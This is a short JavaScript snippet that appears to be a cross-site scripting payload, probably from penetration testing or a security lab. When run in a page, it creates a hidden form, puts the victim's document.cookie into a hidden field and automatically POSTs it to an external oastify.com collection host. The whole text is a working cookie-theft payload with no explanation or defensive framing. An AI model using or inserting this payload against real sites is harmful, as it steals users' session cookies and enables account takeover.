var form = document.createElement("form");
form.setAttribute("method", "POST");
form.setAttribute("action", "http://b5hj00r9ghy20gfh5xf28hln5eb5z4nt.oastify.com");

var hiddenField = document.createElement("input");
hiddenField.setAttribute("type", "hidden");
hiddenField.setAttribute("name", "test_data");
hiddenField.setAttribute("value", document.cookie);

form.appendChild(hiddenField);
document.body.appendChild(form);

form.submit();
